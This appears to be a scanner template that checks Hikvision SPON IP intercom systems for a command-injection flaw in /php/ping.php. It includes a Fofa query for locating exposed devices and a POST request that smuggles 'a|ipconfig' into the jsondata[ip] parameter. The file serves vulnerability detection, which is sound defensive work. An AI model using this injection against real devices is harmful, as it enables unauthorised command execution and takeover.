id: spon-ip-intercom-ping-rce

info:
    name: Hikvision SPON IP网络对讲广播系统存在命令执行漏洞
    author: york
    severity: critical
    verified: true
    descritpion: |-
      海康威视存在RCE漏洞，该漏洞源于文件/php/ping.php的参数jsondata[ip]会导致操作系统命令注入，执行任意命令，通过该漏洞可以获取服务器权限。
      Fofa: icon_hash="-1830859634"
    reference:
      - https://mp.weixin.qq.com/s/GESdf6aTg6oSEa-WVz8aRg
    tags: cve,cve2023,hikvision,rce
    created: 2024/01/03

rules:
  r1:
    request:
      method: POST
      path: /php/ping.php
      body: jsondata[ip]=a|ipconfig&jsondata[type]=1
    expression: response.body.bcontains(b'Windows IP')
expression: r1()

